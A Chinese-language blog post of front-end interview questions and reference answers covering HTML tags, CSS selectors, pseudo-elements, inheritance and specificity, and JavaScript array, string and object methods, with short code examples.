---
title: 前端面试题目 
author: kif
tags:
  - 面试
categories: []
cover: 'https://kifimg.oss-cn-beijing.aliyuncs.com/imgforhexo/202203310851324.jpg'
coverWidth: 1200
coverHeight: 750
feature: true
abbrlink: f1e8
date: 2022-03-31 08:42:00
---
## html基础

### 1.自定义列表

```html
<!DOCTYPE html>
<html lang="zh">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
	<title></title>
</head>
<body>
	<dl>
		<dt></dt>
		<dd></dd>
		<dd></dd>
	</dl>
</body>

```

1.dt中一般是你的列表的表头
2.dd中相当于ul的li中相同的内容
![image-20220316153307245](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310845722.png)

自定义列表一般用于以下内容

![](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310845789.png)

### 2.多媒体标签之音频标签

音频标签以<audio>为代表，<audio>音频标签属性如下：
autoplay="autoplay" 打开页面后，音频会自动播放
controls="controls" 在页面显示控件，比如播放按钮
loop="loop" 循环播放当前音频
src="url" 导入音频文件地址(url是文件地址的统称举例)
注意：
1.谷歌浏览器把autoplay(自动播放)属性给禁用了，所以在谷歌浏览器中没法实现音频自动播放。
2.因为不同浏览器的支持格式不同，我们采取的解决方案是为一个音频准备多个如格式的文件，举例如下：

```html
<audio controls="controls">
        <source src="E:\HTML+CSS\案例\media\案例1.mp3" type="audio/mpeg">
        <source src="E:\HTML+CSS\案例\media\案例1.ogg" type="audio/ogg">
            您的浏览器需要升级，目前不支持audio播放
 </audio>

```

### 3.onerror 事件

onerror 事件在视频/音频（audio/video）数据加载期间发生错误时触发。

```
<video onerror="myFunction()">
```





### 4、为什么link用href获取资源 script和img用src

**参考答案：**

src用于替换当前元素，href用于在当前文档和引用资源之间确立联系。

src

- src是source的缩写，指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求src资源时会将其指向的资源下载并应用到文档内，例如js脚本，img图片和frame等元素

  ```html
  <script src ="js.js"></script> 
  ```

 当浏览器解析到该元素时，**会暂停其他资源的下载和处理**，直到将该资源加载、编译、执行完毕，图片和框架 等元素也如此，类似于将所指向资源嵌入当前标签内。**这也是为什么将js脚本放在底部而不是头部**

href

- `href`是`Hypertext Reference`的缩写，指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接

- 在文档中添加`link`标签，浏览器会识别该文档为`css`文件，就会并行下载资源并且**不会**停止对当前文档的处理。这也是为什么建议使用`link`方式来加载`css`，而不是使用`@import`方式

  ```html
  <link href="common.css" rel="stylesheet"/>
  ```



## CSS



### 1.css选择某一个 (CSS :first-child 选择器,**CSS选择器——伪类选择器**)

q:请将html模块中ul列表的第2个li标签和第4个li标签的背景颜色设置成"rgb(255, 0, 0)"。

```html
<html>
    <head>
        <meta charset=utf-8>
        <style type="text/css">
            /*补全代码*/
            
        </style>
    </head>
    <body>
        <ul>
            <li>1</li>
            <li>2</li>
            <li>3</li>
            <li>4</li>
        </ul>
    </body>
</html>
```

**CSS :first-child 选择器**：:first-child 选择器用于选取属于其父元素的首个子元素的指定选择器。

```css
ul > :first-child + li{
    margin-right: 50px;
}

ul > :first-child + li + li+ li{
    margin-right: 50px;
}
```



### 2、CSS 边框属性

```css
p
  {
  border:5px solid red;
  }
```

可以按顺序设置如下属性：

- border-width
- border-style
- border-color

#### border-style可能的值

| 值      | 描述                                                         |
| :------ | :----------------------------------------------------------- |
| none    | 定义无边框。                                                 |
| hidden  | 与 "none" 相同。不过应用于表时除外，对于表，hidden 用于解决边框冲突。 |
| dotted  | 定义点状边框。在大多数浏览器中呈现为实线。                   |
| dashed  | 定义虚线。在大多数浏览器中呈现为实线。                       |
| solid   | 定义实线。                                                   |
| double  | 定义双线。双线的宽度等于 border-width 的值。                 |
| groove  | 定义 3D 凹槽边框。其效果取决于 border-color 的值。           |
| ridge   | 定义 3D 垄状边框。其效果取决于 border-color 的值。           |
| inset   | 定义 3D inset 边框。其效果取决于 border-color 的值。         |
| outset  | 定义 3D outset 边框。其效果取决于 border-color 的值。        |
| inherit | 规定应该从父元素继承边框样式。                               |

eg:

```
圣诞节来啦！请用CSS给你的朋友们制作一颗圣诞树吧~这颗圣诞树描述起来是这样的：
1. "topbranch"是圣诞树的上枝叶，该上枝叶仅通过边框属性、左浮动、左外边距即可实现。边框的属性依次是：宽度为100px、是直线、颜色为green（未显示的边框颜色都为透明）
2. "middleBranch"是圣诞树的中枝叶，该上枝叶仅通过边框属性即可实现。边框的属性依次是：宽度为200px、是直线、颜色为green（未显示的边框颜色都为透明）
3. "base"是圣诞树的树干，该树干仅通过左外边距实现居中于中枝叶。树干的宽度、高度分别为70px、200px，颜色为gray。
注意：
1. 上枝叶、树干的居中都是通过左外边距实现的
2. 没有显示的边框，其属性都是透明（属性）
3. 仅通过border属性完成边框的所有属性设置
```

![](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310845770.png)

```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset=utf-8>
        <style type="text/css">
            .topbranch {
                width: 0px;
                height: 0px;
                /*
                * TODO: 上枝叶效果
                */
               float:left;
               border-bottom:100px solid green;
               border-left:100px solid transparent;
               border-right:100px solid transparent;
               border-top:100px solid transparent;
               margin-left:100px
               
                
            }
            .middleBranch {
                width: 0px;
                height: 0px;
                /*
                * TODO: 中枝叶效果
                */
                border-bottom:200px solid green;
                border-left:200px solid transparent;
                 border-top:200px solid transparent;
                 border-right:200px solid transparent;
                
                
            }
            .base {
                /*
                * TODO: 树干效果
                */
                width:70px;
                height:200px;
                background-color:gray;
                float:left;
                margin-left:165px
                
            }
        </style>
    </head>
    <body>
    	<section class="topbranch"></section>
        <section class="middleBranch"></section>
        <section class="base"></section>
    </body>
</html>
```

### 3、 **CSS选择器——伪元素**

伪元素是一个附加在选择器末尾的关键词，通过伪元素您不需要借助元素的 ID 或 class 属性就可以对被选择元素的特定部分定义样式。例如通过伪元素您可以设置段落中第一个字母的样式，或者在元素之前、之后插入一些内容等等。

在 CSS1 和 CSS2 中，伪元素的使用与伪类相同，都是使一个冒号`:`与选择器相连。但在 CSS3 中，将伪元素单冒号的使用方法改为了使用双冒号`::`，以此来区分伪类和伪元素。因此，建议在使用伪元素时使用双冒号而不是单冒号。

```css
selector::pseudo-element {
  property: value;
}
```

其中，selector 为选择器，pseudo-element 为伪元素的名称，property 为 CSS 中的属性，value 为属性对应的值。

CSS 中提供了一系列的伪元素，如下表所示：



| 伪元素         | 例子               | 例子描述                                              |
| -------------- | ------------------ | ----------------------------------------------------- |
| ::after        | p::after           | 在每个 <p> 元素之后插入内容                           |
| ::before       | p::before          | 在每个 <p> 元素之前插入内容                           |
| ::first-letter | p::first-letter    | 匹配每个 <p> 元素中内容的首字母                       |
| ::first-line   | p::first-line      | 匹配每个 <p> 元素中内容的首行                         |
| ::selection    | p::selection       | 匹配用户选择的元素部分                                |
| ::placeholder  | input::placeholder | 匹配每个表单输入框（例如 <input>）的 placeholder 属性 |



#### 1. ::after

伪元素 ::after 能够在指定元素的后面插入一些内容，在 ::after 中需要使用 content 属性来定义要追加的内容，而且在 ::after 中必须定义 content 属性才会生效（没有需要插入的内容时可以将 content 属性的值定义为空`""`）。

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        p.one::after {
            content:"";
            display: inline-block;
            width: 50px;
            height: 10px;
            background: blue;
        }
        p.two::after {
            content:"要插入的内容";
            color: red;
            font-size: 6px;
        }
        p.three::after {
            content: url('./smiley.gif');
            position: relative;
            top: 8px;
        }
    </style>
</head>
<body>
    <p class="one">伪元素 ::after</p>
    <p class="two">伪元素 ::after</p>
    <p class="three">伪元素 ::after</p>
</body>
</html>
```

![image-20220318094953912](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310845936.png)

#### 2. ::before

伪元素 ::before 能够在指定元素的前面插入一些内容。与 ::after 相似，::before 中也需要使用 content 属性来定义要追加的内容，而且在 ::before 中必须定义 content 属性才会生效（没有需要插入的内容时可以将 content 属性的值定义为空`""`）。

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        p.one::before {
            content:"";
            display: inline-block;
            width: 50px;
            height: 10px;
            background: blue;
        }
        p.two::before {
            content:"要插入的内容";
            color: red;
            font-size: 6px;
        }
        p.three::before {
            content: url('./smiley.gif');
            position: relative;
            top: 8px;
        }
    </style>
</head>
<body>
    <p class="one">伪元素 ::before</p>
    <p class="two">伪元素 ::before</p>
    <p class="three">伪元素 ::before</p>
</body>
</html>
```

![image-20220318095327303](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310845792.png)

#### 3. ::first-letter

伪元素 ::first-letter 用来设置指定元素中内容第一个字符的样式，通常用来配合 font-size 和 float 属性制作首字下沉效果。需要注意的是，伪元素 ::first-letter 仅可以用于块级元素，行内元素想要使用该伪元素，则需要先将其转换为块级元素。

下面通过示例来演示伪元素 ::first-letter 的使用：

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        p::first-letter{
            font-size: 2em;
            color: blue;
        }
    </style>
</head>
<body>
    <p>伪元素 ::first-letter</p>
</body>
</html>
```

![image-20220318095418822](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310845237.png)

#### 4. ::first-line

伪元素 ::first-line 用来设置指定元素中内容第一行的样式，与 ::first-letter 类似，伪元素 ::first-line 也仅可以用于块级元素，行内元素想要使用该伪元素，则需要先将其转换为块级元素。

下面通过示例来演示伪元素 ::first-line 的使用：

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        p::first-line{
            font-size: 1.5em;
            color: blue;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <p>伪元素 ::first-line 用来设置指定元素中内容第一行的样式，与 ::first-letter 类似，伪元素 ::first-line 也仅可以用于块级元素，行内元素想要使用该伪元素，则需要先将其转换为块级元素。</p>
</body>
</html>
```

![image-20220318095501603](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310845290.png)

#### 5. ::selection

伪元素 ::selection 用来设置对象被选中时的样式，需要注意的是，伪元素 ::selection 中只能定义元素被选中时的 color、background、cursor、outline 以及 text-shadow（IE11 尚不支持定义该属性）等属性。

下面通过示例来演示伪元素 ::selection 的使用：

```html
<!DOCTYPE html>
<html>
<head>
    <style>
        p::selection{
            color: red;
            background-color: #CCC;
        }
    </style>
</head>
<body>
    <p>伪元素 ::selection 用来设置对象被选中时的样式，需要注意的是，伪元素 ::selection 中只能定义元素被选中时的 color、background、cursor、outline 以及 text-shadow（IE11 尚不支持定义该属性）等属性。 </p>
</body>
</html>
```

运行结果如下图所示：



![伪元素 ::selection 的使用](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846862.gif)
图：伪元素 ::selection 的使用

#### 6. ::placeholder

伪元素 ::placeholder 用来设置表单元素（input、textarea 元素）的占位文本（通过 HTML 的 placeholder 属性设置的文本），示例代码如下：

```
<!DOCTYPE html>
<html>
<head>
    <style>
        input.text::placeholder{
            color: red;
            background-color: #CCC;
        }
    </style>
</head>
<body>
    <input placeholder="请输入一段文本">未使用伪元素 ::placeholder<br>
    <input placeholder="请输入一段文本" class="text">使用伪元素 ::placeholder 的效果
</body>
</html>
```

运行结果如下图所示：



![伪元素 ::placeholder 的使用](https://cdn.jsdelivr.net/gh/wkif/imgforTeachingDemo/202203310846269.gif)



### 4、圆角

```
border-radius
```

### 5、**浮动和清除浮动**

#### 清除浮动:

- 父元素内联块元素 inline-block

```
.father{
 display:inline-block
}
```

### 6、固定定位

```
position:fixed
```



### 7、**CSS单位（一）**

#### em和rem

简单的说

- **em:** 就是字体大小，根据元素自身的字体大小来定，如果自身没有定义字体大小，则继承父元素的字体大小，即1em = 1 font-size;
- **rem:** 和em差不多，可以看成是root-em，是根据根元素的字体大小来定义的，即html设置的字体大小来定义，默认html的字体大小是16px；





### 8、继承相关

css的继承：就是给父级设置一些属性，子级继承了父级的该属性，这就是我们的css中的继承。 官方解释，继承是一种规则，它允许样式不仅应用于特定的html标签元素，而且应用于其后代元素。

**无继承性的属性**

1、display：规定元素应该生成的框的类型

2、文本属性：

vertical-align：垂直文本对齐

text-decoration：规定添加到文本的装饰

text-shadow：文本阴影效果

white-space：空白符的处理

unicode-bidi：设置文本的方向

3、盒子模型的属性：width、height、margin 、margin-top、margin-right、margin-bottom、margin-left、border、 border-style、border-top-style、border-right-style、border-bottom-style、border-left-style、border-width、border-top-width、border-right-right、border-bottom-width、border-left-width、border-color、border-top-color、border-right-color、border-bottom-color、border-left-color、border-top、border-right、border-bottom、border-left、padding、padding-top、padding-right、padding-bottom、padding-left

4、背景属性：background、background-color、background-image、background-repeat、background-position、background-attachment

5、定位属性：float、clear、position、top、right、bottom、left、min-width、min-height、max-width、max-height、overflow、clip、z-index

6、生成内容属性：content、counter-reset、counter-increment

7、轮廓样式属性：outline-style、outline-width、outline-color、outline

8、页面样式属性：size、page-break-before、page-break-after

9、声音样式属性：pause-before、pause-after、pause、cue-before、cue-after、cue、play-during

**有继承性的属性**

1、字体系列属性

font：组合字体

font-family：规定元素的字体系列

font-weight：设置字体的粗细

font-size：设置字体的尺寸

font-style：定义字体的风格

font-variant：设置小型大写字母的字体显示文本，这意味着所有的小写字母均会被转换为大写，但是所有使用小型大写 字体的字母与其余文本相比，其字体尺寸更小。

font-stretch：对当前的 font-family 进行伸缩变形。所有主流浏览器都不支持。

font-size-adjust：为某个元素规定一个 aspect 值，这样就可以保持首选字体的 x-height。

2、文本系列属性

text-indent：文本缩进

text-align：文本水平对齐

line-height：行高

word-spacing：增加或减少单词间的空白（即字间隔）

letter-spacing：增加或减少字符间的空白（字符间距）

text-transform：控制文本大小写

direction：规定文本的书写方向

color：文本颜色 a元素除外

3、元素可见性：visibility

4、表格布局属性：caption-side、border-collapse、border-spacing、empty-cells、table-layout

5、列表布局属性：list-style-type、list-style-image、list-style-position、list-style

6、生成内容属性：quotes

7、光标属性：cursor

8、页面样式属性：page、page-break-inside、windows、orphans

9、声音样式属性：speak、speak-punctuation、speak-numeral、speak-header、speech-rate、volume、voice-family、 pitch、pitch-range、stress、richness、、azimuth、elevation

**所有元素可以继承的属性**

1、元素可见性：visibility

2、光标属性：cursor

**内联元素可以继承的属性**

1、字体系列属性

2、除text-indent、text-align之外的文本系列属性

**块级元素可以继承的属性**

1、text-indent、text-align





### 9、css预处理工具

**参考答案**：

**CSS 预处理器**是一个能让你通过预处理器自己独有的语法来生成CSS的程序。

css预处理器种类繁多，三种主流css预处理器是Less、Sass（Scss）及Stylus；它们各自的背景如下:

Sass：

2007年诞生，最早也是最成熟的CSS预处理器，拥有ruby社区的支持和compass这一最强大的css框架，目前受LESS影响，已经进化到了全面兼容CSS的SCSS（SCSS 需要使用分号和花括号而不是换行和缩进）。

Less：

2009年出现，受SASS的影响较大，但又使用CSS的语法，让大部分开发者和设计师更容易上手，在ruby社区之外支持者远超过SASS。其缺点是比起SASS来，可编程功能不够。优点是简单和兼容CSS，反过来也影响了SASS演变到了SCSS的时代，著名的Twitter Bootstrap就是采用LESS做底层语言的。

Stylus：

2010年产生，来自Node.js社区，主要用来给Node项目进行CSS预处理支持，在此社区之内有一定支持者，在广泛的意义上人气还完全不如SASS和LESS。

**比较**

在使用 CSS 预处理器之前最重要的是理解语法，幸运的是基本上大多数预处理器的语法跟 CSS 都差不多。

首先 Sass 和 Less 都使用的是标准的 CSS 语法，因此如果可以很方便的将已有的 CSS 代码转为预处理器代码，默认 Sass 使用 .sass 扩展名，而 Less 使用 .less 扩展名。

```css
h1 {
  color: #0982C1;
}
```

这是一个再普通不过的，不过 Sass 同时也支持老的语法，就是不包含花括号和分号的方式：

```css
h1
color: #0982c1
```

而 Stylus 支持的语法要更多样性一点，它默认使用 .styl 的文件扩展名，下面是 Stylus 支持的语法

```css
/* style.styl */
h1 {
  color: #0982C1;
}
/* omit brackets */
h1
color: #0982C1;
/* omit colons and semi-colons */
h1
color #0982C1
```

可以在同一个样式单中使用不同的变量，例如下面的写法也不会报错：

```css
h1 {
  color #0982c1
}
h2
font-size: 1.2em
```



### 10、行内元素和块级元素什么区别，然后怎么相互转换

**参考答案:**

**块级元素**

1.总是从新的一行开始，即各个块级元素独占一行，默认垂直向下排列；

2.高度、宽度、margin及padding都是可控的，设置有效，有边距效果；

3.宽度没有设置时，默认为100%；

4.块级元素中可以包含块级元素和行内元素。

**行内元素**

1.和其他元素都在一行，即行内元素和其他行内元素都会在一条水平线上排列；

2.高度、宽度是不可控的，设置无效，由内容决定。

3.根据标签语义化的理念，行内元素最好只包含行内元素，不包含块级元素。

**转换**

当然块级元素与行内元素之间的特性是可以相互转换的。HTML可以将元素分为行内元素、块状元素和行内块状元素三种。

使用display属性能够将三者任意转换：

(1)display:inline;转换为行内元素；

(2)display:block;转换为块状元素；

(3)display:inline-block;转换为行内块状元素。

### 11、样式优先级

**参考答案**：

样式类型

样式类型分为三类

1. 行间

```xml
<h1 style="font-size:12px;color:#000;">我的行间CSS样式。</h1>
```

1. 内联

```xml
<style type="text/css">
   h1{font-size:12px;
      color:#000;
      }
</style>
```

1. 外部

```xml
<link rel="stylesheet" href="css/style.css">
```

选择器类型

- 1、ID　　#id
- 2、class　　.class
- 3、标签　　p
- 4、通用　　*
- 5、属性　　[type="text"]
- 6、伪类　　:hover
- 7、伪元素　　::first-line
- 8、子选择器、相邻选择器

权重计算规则

第一等：代表内联样式，如: style=””，权值为1000。
第二等：代表ID选择器，如：#content，权值为0100。
第三等：代表类，伪类和属性选择器，如.content，权值为0010。
第四等：代表类型选择器和伪元素选择器，如div p，权值为0001。
通配符、子选择器、相邻选择器等的。如*、>、+,权值为0000。
继承的样式没有权值。

比较规则

遵循如下法则：

- 选择器都有一个权值，权值越大越优先；
- 当权值相等时，后出现的样式表设置要优于先出现的样式表设置；
- 创作者的规则高于浏览者：即网页编写者设置的 CSS 样式的优先权高于浏览器所设置的样式；
- 继承的 CSS 样式不如后来指定的 CSS 样式；
- 在同一组属性设置中标有!important规则的优先级最大
- 通配符、子选择器、相邻选择器等的。虽然权值为0000，但是也比继承的样式优先。

！important

1. !important 的作用是提升优先级，换句话说。加了这句的样式的优先级是最高的（比内联样式的优先级还高)。

```xml
<style> 
p{
    color:red !important;
} 
</style>
<p style="color:blue;">我显示红色</p>
```

1. ie7+和别的浏览器对important的这种作用的支持度都很好。只有ie6有些bug

```cpp
p{
      color:red !important;
      color:blue;    
 }//会显示blue
```

但是这并不说明ie6不支持important，只是支持上有些bug。看下面

```cpp
p{
     color:red !important;  
}
p{
    color:blue;  
} //这样就会显示的是red。说明ie6还是支持important的。</pre>
```

### 12、盒子塌陷是什么？

**参考答案：**

**盒子塌陷**

本应该在父盒子内部的元素跑到了外部。

原因：

当父元素没设置足够大小的时候，而子元素设置了浮动的属性，子元素就会跳出父元素的边界（脱离文档流），尤其是当父元素的高度为auto时，而父元素中又没有其它非浮动的可见元素时，父盒子的高度就会直接塌陷为零， 我们称这是**CSS高度塌陷**。

**关于盒子塌陷的几种解决方法**

（1）最简单，直接，粗暴的方法就是盒子大小写死，给每个盒子设**定固定的width和height**，直到合适为止，这样的好处是简单方便，兼容性好，适合只改动少量内容不涉及盒子排布的版面。缺点是非自适应，浏览器的窗口大小直接影响用户体验。

（2）给外部的父盒子也添加浮动，让其也脱离标准文档流，这种方法方便，但是对页面的布局不是很友好，不易维护。

（3）给父盒子添加overflow属性。

 overflow:auto; 有可能出现滚动条，影响美观。

 overflow:hidden; 可能会带来内容不可见的问题。

（4）父盒子里最下方引入清除浮动块。最简单的有：

```html
    <br style="clear:both;"/>
```

有很多人是这么解决的，但是我们并不推荐，因为其引入了不必要的冗余元素 。

 (5)用after伪元素清除浮动

给外部盒子的after伪元素设置clear属性，再隐藏它

这其实是对空盒子方案的改进，一种纯CSS的解决方案，不用引入冗余元素。

```css
.clearfix {*zoom: 1;}

.clearfix:before,.clearfix:after {

display: table;

line-height: 0;

content: "";

}

.clearfix:after {clear: both;}
```

这也是bootstrap框架采用的清除浮动的方法。

这是一种纯CSS的解决浮动造成盒子塌陷方法，没有引入任何冗余元素，推荐使用此方法来解决CSS盒子塌陷。

备注：第五种方法虽好，但是低版本IE不兼容，具体选择哪种解决方法，可根据实际情况决定。

(6) 给父盒子添加border

(7) 给父盒子设置padding-top



### 13、css 伪类与伪元素区别

**参考答案**：

1. 伪类(pseudo-classes)

- 其核⼼就是⽤来选择DOM树之外的信息,不能够被普通选择器选择的⽂档之外的元素，⽤来添加⼀些选择器的特殊效果。
- ⽐如:hover :active :visited :link :visited :first-child :focus :lang等
- 由于状态的变化是⾮静态的，所以元素达到⼀个特定状态时，它可能得到⼀个伪类的样式；当状态改变时，它⼜会失去这个样式。
- 由此可以看出，它的功能和class有些类似，但它是基于⽂档之外的抽象，所以叫 伪类。

1. 伪元素(Pseudo-elements)

- DOM树没有定义的虚拟元素
- 核⼼就是需要创建通常不存在于⽂档中的元素，
- ⽐如::before ::after 它选择的是元素指定内容，表示选择元素内容的之前内容或之后内容。
- 伪元素控制的内容和元素是没有差别的，但是它本身只是基于元素的抽象，并不存在于⽂档中，所以称为伪元素。⽤于将特殊的效果添加到某些选择器

1. 伪类与伪元素的区别

- 表示⽅法
  - CSS2 中伪类、伪元素都是以单冒号:表示,
  - CSS2.1 后规定伪类⽤单冒号表示,伪元素⽤双冒号::表示，
  - 浏览器同样接受 CSS2 时代已经存在的伪元素(:before, :after, :first�line, :first-letter 等)的单冒号写法。
  - CSS2 之后所有新增的伪元素(如::selection)，应该采⽤双冒号的写法。
  - CSS3中，伪类与伪元素在语法上也有所区别，伪元素修改为以::开头。浏览器对以:开头的伪元素也继续⽀持，但建议规范书写为::开头
- 定义不同
  - 伪类即假的类，可以添加类来达到效果
  - 伪元素即假元素，需要通过添加元素才能达到效果
- 总结:
  - 伪类和伪元素都是⽤来表示⽂档树以外的"元素"。
  - 伪类和伪元素分别⽤单冒号:和双冒号::来表示。
  - 伪类和伪元素的区别，关键点在于如果没有伪元素(或伪类)，
  - 是否需要添加元素才能达到效果，如果是则是伪元素，反之则是伪类
  - 伪类和伪元素都不出现在源⽂件和DOM树中。也就是说在html源⽂件中是看不到伪类和伪元素的。
  - 伪类其实就是基于普通DOM元素⽽产⽣的不同状态，他是DOM元素的某⼀特征。
  - 伪元素能够创建在DOM树中不存在的抽象对象，⽽且这些抽象对象是能够访问到的。



### 14、行内元素的margin 和 padding

**参考答案：**

- 水平方向：水平方向上，都有效；
- 垂直方向：垂直方向上，都无效；（`padding-top` 和 `padding-bottom` 会显示出效果，但是高度不会撑开，不会对周围元素有影响）



### 15、min-width/max-width 和 min-height/max-height 属性间的覆盖规则？

**参考答案**：

1. max-width 会覆盖 width，即使 width 是行内样式或者设置了 !important。
2. min-width 会覆盖 max-width，此规则发生在 min-width 和 max-width 冲突的时候；



### 16、未知高度元素垂直居中、水平居中的实现方式有哪些？

**参考答案：**

**1、绝对定位+css3 transform:translate(-50%，-50%)**

```css
.wrap{
  position:relative;
}
.child{
  position: absolute;
  top:50%;
  left:50%;
  -webkit-transform:translate(-50%,-50%);
}
```

**2、css3 的flex布局**

```css
.wrap{
  display:flex;
  justify-content:center;
}
.child{
  align-self:center;
}
```

**3、table布局**

```css
<div class="wrap">
   <div class="child">
          <div>sadgsdgasgd</div>
   </div>
</div>
.wrap{
  display:table;
  text-align:center;
}
.child{
  background:#ccc;
  display:table-cell;
  vertical-align:middle;
}
.child div{
    width:300px;
    height:150px;
    background:red;
    margin:0 auto;
}
```



## Javascript

### 1、JS中的instanceof运算符

instanceof运算符用来判断一个构造函数的prototype属性所指向的对象是否存在另外一个要检测对象的原型链上

```
obj instanceof Object;//true 实例obj在不在Object构造函数中
```

eg：

请补全JavaScript函数，要求以Boolean的形式返回第一个参数是否属于第二个参数对象的实例。

```
function _instanceof(left,right) {
    // 补全代码
    return (left instanceof right )
    
}
```

### 2、排序

sort() 方法对数组的项目进行排序。

按升序对数组中的数字进行排序：

```
var points = [40, 100, 1, 5, 25, 10];
points.sort(function(a, b){return a-b});
```

按降序对数组中的数字进行排序：

```
var points = [40, 100, 1, 5, 25, 10];
points.sort(function(a, b){return b-a});
```

### 3、JS字符串大写和小写之间的转换

String 字符串大小写转换方法

| 字符串方法          | 说明               |
| ------------------- | ------------------ |
| toLocaleLowerCase() | 把字符串转换成小写 |
| toLocaleUpperCase() | 将字符串转换成大写 |
| toLowerCase()       | 将字符串转换成小写 |
| toUpperCase()       | 将字符串转换成大写 |

```js
var s = "JavaScript";
console.log(s.toUpperCase()); 
```



### 4、javascript如何删除指定数组元素

1. 使用delete关键字；

   ```
   var colors = ["red", "blue", "grey", "green"];
   delete colors[0];
   console.log(colors); // [undefined, "blue", "grey", "green"]
   
   ```

   **使用delete删除元素之后数组长度不变，只是被删除元素被置为undefined了**

2. 使用splice()操作方法；

   ```
   var colors = ["red", "blue", "grey"];
   var color = colors.splice(0, 1);
   console.log(color); // "red"
   console.log(colors); // ["blue", "grey"]
   ```

   在删除数组元素的时候，它可以删除任意数量的项，只需要指定2个参数：要删除的第一项的位置和要删除的项数。

   

3. 迭代方法，用循环迭代数组元素，发现符合要删除的项则删除；

   第一种用最常见的ForEach循环来对比元素找到之后将其删除。

   ```
   var colors = ["red", "blue", "grey"];
   
    
   
   colors.forEach(function(item, index, arr) {    if(item === "red") {
   
           arr.splice(index, 1);
   
       }
   
   })
   ```

   ```
   var colors = ["red", "blue", "grey"];
   
    
   
   colors = colors.filter(function(item) {    return item != "red"});
   
     
   
   console.log(colors); // ["blue", "grey"]
   ```

   

4. prototype原型方法，在Array的原型上添加方法来达到删除的目的。







### 5、数组方法

#### 数组方法概括

| 方法名        | 对应版本 | 功能                                                         | 原数组是否改变 |
| ------------- | :------- | :----------------------------------------------------------- | :------------- |
| concat()      | ES5-     | 合并数组，并返回合并之后的数据                               | n              |
| join()        | ES5-     | 使用分隔符，将数组转为字符串并返回                           | n              |
| pop()         | ES5-     | 删除最后一位，并返回删除的数据                               | y              |
| shift()       | ES5-     | 删除第一位，并返回删除的数据                                 | y              |
| unshift()     | ES5-     | 在第一位新增一或多个数据，返回长度                           | y              |
| push()        | ES5-     | 在最后一位新增一或多个数据，返回长度                         | y              |
| reverse()     | ES5-     | 反转数组，返回结果                                           | y              |
| slice()       | ES5-     | 截取指定位置的数组，并返回                                   | n              |
| sort()        | ES5-     | 排序（字符规则），返回结果                                   | y              |
| splice()      | ES5-     | 删除指定位置，并替换，返回删除的数据                         | y              |
| toString()    | ES5-     | 直接转为字符串，并返回                                       | n              |
| valueOf()     | ES5-     | 返回数组对象的原始值                                         | n              |
| indexOf()     | ES5      | 查询并返回数据的索引                                         | n              |
| lastIndexOf() | ES5      | 反向查询并返回数据的索引                                     | n              |
| forEach()     | ES5      | 参数为回调函数，会遍历数组所有的项，回调函数接受三个参数，分别为value，index，self；forEach没有返回值 | n              |
| map()         | ES5      | 同forEach，同时回调函数返回数据，组成新数组由map返回         | n              |
| filter()      | ES5      | 同forEach，同时回调函数返回布尔值，为true的数据组成新数组由filter返回 | n              |
| every()       | ES5      | 同forEach，同时回调函数返回布尔值，全部为true，由every返回true | n              |
| some()        | ES5      | 同forEach，同时回调函数返回布尔值，只要由一个为true，由some返回true | n              |
| reduce()      | ES5      | 归并，同forEach，迭代数组的所有项，并构建一个最终值，由reduce返回 | n              |
| reduceRight() | ES5      | 反向归并，同forEach，迭代数组的所有项，并构建一个最终值，由reduceRight返回 | n              |

**用slice(0)复制一个数组**

**a.splice(index,0,item)：在数组a的第index位置插入item**

**最大值 ;Math.max.apply(Math,array)**





### 6、对象

#### Number 对象



Number 对象是原始数值的包装对象，创建 Number 对象的语法格式如下：

```
var myNum = new Number(value);
var myNum = Number(value);
```

其中 value 为要创建的 Number 对象的数值，若 value 为一个非数字的值，则会尝试将其转换为数字，若转换失败则会返回 NaN。

eg:请补全JavaScript函数，要求将数字参数转换为对象的形式返回。

```
function _numbertoobject(number) {
    // 补全代码
    var myNum = new Number(number);
    return myNum
    
}
```

#### **对象字符串**

JavaScript String 对象用于处理字符串，其中提供了大量操作字符串的方法，以及一些属性。

创建 String 对象的语法格式如下：

```
var val = new String(value);
var val = String(value);
```













#### 对象属性遍历：

- 使用 for in 循环遍历对象的属性时，**原型链上的所有属性**都将被访问：

  ```js
  var obj={"name":"wjy","age":26,"sex":"female"};//定义一个object对象   
  var keys=[];//定义一个数组用来接受key   
  var values=[];//定义一个数组用来接受value   
    for(var key in obj){   
      keys.push(key);   
      values.push(obj[key]);//取得value     
      }   
  alert("keys is ："+keys+" and values is ："+values);  
  ```

  

- Object.keys(xx)/Object.values(xx)

  ```js
  console.log(Object.keys(obj));
  console.log(Object.values(obj));
  //输出：["name", "career"]
  //输出：[ "Poly", "it"]
  ```

#### 添加属性

```js
   //创建obj对象
    var obj = new Object();
    //为对象添加动态属性
    obj.userName = "admin";
    obj.passWord = "123456";
    //输出
    console.log(obj); 
```

#### 删除对象属性

```js
    //创建obj动态对象
    var obj = new Object();
    //为对象添加动态属性
    obj.userName = "admin";
    obj.passWord = "123456";    
    //移除属性
    delete obj.passWord;
    console.log(obj);
```



### 7、字符串

#### String 对象中的方法

下表中列举了 String 对象中提供的方法及其描述信息：



| 方法                | 描述                                                         |
| ------------------- | ------------------------------------------------------------ |
| anchor()            | 创建一个 HTML 锚点，即生成一个`<a>`标签，标签的 name 属性为 anchor() 方法中的参数 |
| big()               | 用大号字体显示字符串                                         |
| blink()             | 显示闪动的字符串                                             |
| bold()              | 使用粗体显示字符串                                           |
| charAt()            | 返回在指定位置的字符                                         |
| charCodeAt()        | 返回指定字符的 Unicode 编码                                  |
| concat()            | 拼接字符串                                                   |
